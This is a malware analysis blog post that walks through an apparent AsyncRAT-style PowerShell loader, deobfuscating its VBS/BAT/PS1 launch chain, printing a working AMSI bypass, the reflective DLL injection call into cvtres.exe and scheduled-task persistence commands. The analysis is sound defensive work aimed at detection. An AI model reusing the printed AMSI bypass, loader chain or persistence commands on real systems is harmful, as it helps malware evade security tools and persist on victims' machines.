---
title: Deep Analysis of a Powershell-Based Reflective DLL Injection Sample, Part 1
author: misthi0s
categories:
- malware
tags: 
- malware
- .net
- powershell
- AsyncRAT
- dll
- reflection
date: 2024-05-12 12:42:00
---

Reflective DLL injection is a common technique used by malware that allows an attacker to inject a DLL into a running process without first having to write that DLL to disk. Keeping the DLL binary in memory as opposed to writing to disk provides a few different advantages, particularly in the case of security tools. Files written to disk are commonly scanned by anti-malware tools on creation as well as loading, making malicious DLLs more likely to be discovered and quarantined if created on the system. Keeping the DLL completely within memory during each point of the infection makes it less likely that any security products on the target will discover and stop it. Likewise, by keeping the DLL within memory and never writing it to disk, it can make it harder for incident responders or malware analysts to determine what the DLL's purpose is. This second point, however, is still possible if one knows how to extract it from memory or from the originating location where the DLL's contents are stored.

In this post, we will take a deep dive into a sample that uses this technique to execute a commonly used C2 framework implant (no spoilers!) on the system. The sample in question starts with a PowerShell script and uses built-in .NET methods within PowerShell to perform the DLL injection. For anyone who wants to follow along, the sample in question can be found on MalwareBazaar [here](https://bazaar.abuse.ch/sample/1d8263d5990e55619974f81ed1dd441def3f761fcecb160f056a459b74e635c6/). With that, let's dive in!

## First Section - Visual Basic

For brevity's sake, we will skip over the numerous "Start-Sleep" commands configured within this script to space out each action that the script takes and focus more on the juicy commands that are being run. This script is rather interesting as its main focus is to write various other commands into different files to be executed at a later time. The first set of content is writes into a newly created file is as follows:

```
$Content = @'
on error resume next
Set clay = CreateObject(Replace("W!S!c!r!i!p!t!.!S!h!e!l!l","!",""))
clay.Run chr(34) & "C:\Users\Public\svchost.bat" & Chr(34), 0
'@
Set-Content -Path C:\Users\Public\svchost.vbs -Value $Content
```

The first thing to note in this block is that the content within the `$Content` variable is not PowerShell, but is instead Visual Basic. This means that this particular sample appears to be jumping between different programming languages, which can be common for malware that wants to execute contents under various processes to try to hide its execution or confuse those looking at the process chain.

There is some basic "find and replace" obfuscation going on here, but looking at the contents, we can rather easily see that it is spelling out `WScript.Shell`. On the next line after this, we can see that it is running `WScript.Shell.Run` against a path that contains `C:\Users\Public\svchost.bat`. Using `chr` is another common obfuscation technique, telling the interpreter to include the character value of decimal `34` in this location and concatenating it to the previous mentioned string. In this case, character `34` refers to the double quote (") character. All in all, the full deobfuscated line that makes up the contents of this `$Content` variable is the following:

`WScript.Shell.Run "C:\Users\Public\svchost.bat",0`

This, effectively, is telling the Visual Basic interpreter to execute the `C:\Users\Public\svchost.bat` file, with the `,0` meaning that it should do this within a new window.

With the contents of the `$Content` variable out of the way, the PowerShell script then uses `Set-Content` to write this variable into a file called `C:\Users\Public\svchost.vbs`. This means that, when this VBS file is executed, it will simply run the `WScript.Shell.Run` command mentioned above.

## Second Section - PowerShell

The next block of code looks similar to the first; it contains a `$Content` variable containing code, followed by a `Set-Content` to write the contents of the variable to a file. This block can be seen below:

```
$Content = @'
PowerShell -NoProfile -ExecutionPolicy Bypass -Command C:\Users\Public\svchost.ps1
'@
Set-Content -Path C:\Users\Public\svchost.bat -Value $Content
```

This block is quite a bit less complicated than the first. The `$Content` variable here is set up to simply launch a new PowerShell process and execute a script at `C:\Users\Public\svchost.ps1`. We haven't seen yet what is contained within this file, but it's going to likely be written further down in the main script.

Regardless, this content is written to the file `C:\Users\Public\svchost.bat`, which is the name of the file written to in the first block of code. As of right now, this means that when `svchost.vbs` is executed, it will in turn execute `svchost.bat`, which will then in turn execute `svchost.ps1`. Initial observations of this script so far shows us that it uses a rather convuluted process of executing different scripts that don't really do anything other than execute further scripts. This chain of scripts is likely meant to throw off security tools and analysts and create a more confusing process chain than simply executing from a script directly to the main payload.

## Third Section - Security Bypass

The next `$Content` block is where the script gets really interesting. There are four different things going on in this variable, and we'll go through them one by one.

The first part of the code block is heavily obfuscated, as can be seen below:

```
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE (('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

Let's go through this step-by-step.

### Third Section - Step 1 - Variable Declaration

The first set of code in this block is as follows:

```
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','rE' ) ) ;
```

This may look weird, but it's rather simplistic in its obfuscation. First, it uses backtick marks (\`) between letters; these backticks are ignored by the interpreter when executed, which effectively means that ``S`eT-It`em`` simply means `Set-Item`. The rest of the first part of this string is simply character concatenation, which resolves to `Variable:1q2uZx`. Finally, the third type of obfuscation used in this block is basic string formatting. This simply means that the string is put together based on an array of values. In this case, we have `{1}{0}`, which means that the second item in the array ({1}) is immediately followed by the first item in the array ({0}). The array starts after the `-F` flag, meaning `F` is the first item and `rE` is the second item. This, in turns, will format together into `[TYpE]reF`. This is a special type of variable that is known as a `reference type`; that is, rather than it being a variable holding a value, it is a variable holding a reference. The `[ref]` variable is a special pointer to the class `System.Management.Automation.PSReference`.

All in all, the full deobfuscated string for this code block will look like the following:

`Set-Item variable:1q2uZx System.Management.Automation.PSReference`

This is simply creating a `PSReference` object into a session-specific variable named `1q2uZx`.

### Third Section - Step 2 - Variable Reference

The second set of code in the block is:

```
( Get-varI`A`BLE (('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"
```

The first part of this is simply getting the value of the variable `1q2uZx` that was created in the previous command. This variable is simply a reference to the `System.Management.Automation` namespace within the .NET framework. For those unaware, this namespace is effectively the .NET runtime used for PowerShell. All things PowerShell, from running commands, accessing the file system, managing processes, etc, execute within this namespace. 

For this command, it is accessing the assemblies found within this namespace, due to the `.Assembly` part of the command. It is also looking for a specific one, as it specifies `GetType` (what it is looking for will be covered in the next section).

So all in all, this part of the code is simply accessing a specific class, and looks like the following after deobfuscation:

`[ref].Assembly.GetType`

### Third Section - Step 3 - String Concatenation

To determine which class the above command is looking for, we have to do some more string formatting deobfuscation. The code can be seen below:

```
"{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')
```

Following through the logic mentioned above about how to deobfuscate this, we get the following string:

`System.Management.Automation.AmsiUtils`

By now, you may have guessed exactly what this whole block of code is doing, but for now, let's continue piecing it together. So far, our full line of code looks like the following:

`[ref].Assembly.GetType("System.Management.Automation.AmsiUtils")`

### Third Section - Step 4 - More String Concatenation

The next block of code is the following:

```
."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))
```

More basic string formatting. Though this time, we can see that there are two sections to it; the first section uses the code `{0}{2}{1}`, while the second section uses `{2}{4}{0}{1}{3}`. We can also see that they are separated by a comma.

Following through again with our deobfuscation, our first section turns out to be `amsiInitFailed` and the second section correlates to `NonPublic,Static`. This makes the full deobfuscated string:

`.GetField("amsiInitFailed","NonPublic,Static")`

Since we now have a `.GetField` command, this means that we are trying to access specific fields within the class mentioned previously and look at or manipulate their values. The full line of code is now thusly:

`[ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static")`

### Third Section - Step 5 - Final Deobfuscation

The final bit of obfuscated code in this section is:

```
."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

We can tell just from looking at this that the command now is `.SetValue`, meaning the code will be actively manipulating the fields retrieved in the previous section.

The obfuscation in this section is pretty much the same as the previous, with one difference; the addition of the `${}` characters around the variables. In PowerShell, this is simply another method of declaring a variable that is mostly the same. Declaring variable `${test}` and `$test` are the same thing. This means that the variables declared in the above code will equate to `$null` and `$true`.

This makes the whole line of code look like the following:

`.SetValue($null,$true)`

### Third Section - Final Step - All Together

All in all, this makes the full obfuscated block of code look like the following:

```
[ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
```

For those who have not figured it out yet, this line of code is what is known as an AMSI bypass. AMSI (Antimalware Scan Interface) is an interface built in to newer Windows versions that facilitates the integration of applications and services with security products installed on the computer. One of its major features is that it is integrated into the scripting interpreters that are shipped with Windows. This means that it is particularly effective in scanning dynamic script-based malware that may otherwise elude normal security products, particularly if the script performs most or all of its malicious actions in memory.

There are numerous ways to bypass AMSI, with this being one method. In fact, this exact AMSI bypass was discovered back in 2016 by Matt Graeber as can be seen in a screenshot of a tweet [here](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/). If an attacker can successfully bypass AMSI, there's a better chance that their malicious script will execute without intervention.

## Fourth Section - Binary Blobs

After the AMSI bypass, we can see two variables that contain very long byte arrays. We'll dig further into these two blobs in later posts in this series, but for now, let's keep a note of their names: `datarun` and `datanj`.

 ## Fifth Section - Reflective DLL Injections 

Now we get to the crux of the script; the actuall reflective DLL injection code:

```
[Reflection.Assembly]::'Load'($datanj).'GetType'('root.clay').GetMethod('Run').Invoke($null,[object[]] ('C:\Windows\Microsoft.NET\Framework\v4.0.30319\cvtres.exe',$datarun))
```

The `[Reflection.Assembly]::'Load'` portion of this code is a .NET method. Specifically, it is a .NET method used to load the specified assembly. In this case, the assembly in question being loaded resides within the `$datanj` binary blog that we saw earlier. This means that the binary blob stored in the `$datanj` variable is some type of assembly, likely either an EXE or a DLL. In any case, the next portion of the code tells the script where to look within this assembly. It will look for a namespace named `root` and within that namespace, look for a class named `clay`. Finally, within this class, it looks for a method named `Run` to execute. This is where the crux of the code will run from within the assembly.

We can see the from the `.Invoke` portion of the command, that the `Run` method takes some sort of parameters as input. This is recognized by the two variables `C:\Windows\Microsoft.NET\Framework\v4.0.30319\cvtres.exe` and `$datarun`. From just looking at the parameters, we can make some logical assumptions. Firstly, the first input is a legitimate Windows program called `cvtres.exe`, which is used to "convert resource files to COFF objects." This application is used frequently by malware during process hollowing; that is, removing legitimate code within a process with malicious code and re-executing the process. This allows the malware to hide on the system, as the malicious behavior is stemming from a legitimate program, making detection less likely. This first parameter being passed is likely the application chosen by the threat actor to run the malicious program under. Secondly, the second input is the `$datarun` binary blob from earlier. This is likely the main malicious program that will be injected into the `cvtres.exe` process when the assembly is done executing. These are simply assumptions based on past experience, but there's a very high likelihood that this is what the assembly in question is configured to do.

All of these items, from the AMSI bypass in section three to the DLL injection command is then written into a file named `C:\Users\Public\svchost.ps1`. If you remember, this is the script mentioned in the `svchost.bat` file that was created earlier in the script.

## Sixth Section - Main Payload Execution

Once all this setup has been completed, the payloads finally execute with the following command:

```
Invoke-Item "C:\Users\Public\svchost.vbs"
```

Let's review the full process chain, now that all the files have been created. If you remember, this `svchost.vbs` file that is being invoked contain Visual Basic code that simply uses the method `WScript.Shell.Run` to execute the `svchost.bat` file. The `svchost.bat` file, in turn, launches a new PowerShell process that executes the `svchost.ps1` file. This `svchost.ps1` file contains the primary malicious code, which will perform the AMSI bypass and then use reflective DLL injection to execute malicious code within a `cvtres.exe` process.

This unique process chain makes for a good detection capability for this malware; not to mention, the fact that the files are written to the `C:\Users\Public` directory and are all named `svchost` after one of the main Windows processes on any system, there's a lot here that detection engineers and security analysts can key off of to look for this malware executing on an endpoint.

## Seventh Section - Persistence

While the main payload has been executed at this point, the infection script is not quite done yet. Another `$Content` variable block contains the following code:

```
try 
{
schtasks.exe /create /tn MicrosoftRecovery /sc minute  /st 00:10 /tr C:\Users\Public\svchost.vbs

schtasks.exe /create /tn MicrosoftArts /SC minute /MO 3 /tr C:\Users\Public\svchost.vbs
} catch { }
```

This is where the script establishes persistence for the payload file chain. It creates two scheduled tasks, using the `schtasks.exe` process, to trigger the main `svchost.vbs` file at different intervals. The first one named `MicrosoftRecovery` is configured to run the task at 12:10 AM of the current day and then every one minute afterwards. The second one named `MicrosoftArts` is configured to run every three minutes.

It's interesting that two different scheduled tasks, with different names and time configurations, are created to run the same file. This was likely done to add some resilience to the persistence; if one scheduled task is found and deleted, there's the possibility that the second one was missed, allowing the persistence mechanism to... persist on the device. This was likely done by the threat actor to try to make the infection stick around on the machine for as long as possible.

Regardless, this block of code is written to a file named `C:\Users\Public\inst.ps1`. After it is created, it is then executed with the following PowerShell command:

```
powershell -windo 1 -noexit -exec bypass -file "C:\Users\Public\inst.ps1"
```

## End of Part 1

And there we have it! That was a deep dive through the main infection script of this particular piece of malware. In part 2, we'll take a closer look at the binary blob that acts as the reflective DLL injection mechanism, and part 3 will be all about that final payload that is the reason for all of this behavior in the first place. Stay tuned and thanks for reading!!